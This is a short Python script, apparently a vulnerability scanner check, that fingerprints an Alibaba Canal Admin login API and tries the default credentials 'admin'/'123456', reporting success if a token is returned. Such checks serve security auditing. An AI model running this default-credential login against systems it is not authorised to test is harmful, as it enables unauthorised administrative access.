import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"api/v1/user/login"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	body=''
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "com.alibaba.otter.canal.admin.controller.UserController.login" in response.text:
		r0=True
	else:
		r0=False
	url=baseurl+"api/v1/user/login"
	body='{"username":"admin","password":"123456"}'
	headers={'Content-Type': 'application/json'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "{\"code\":20000," in response.text and "\"data\":{\"token\"" in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
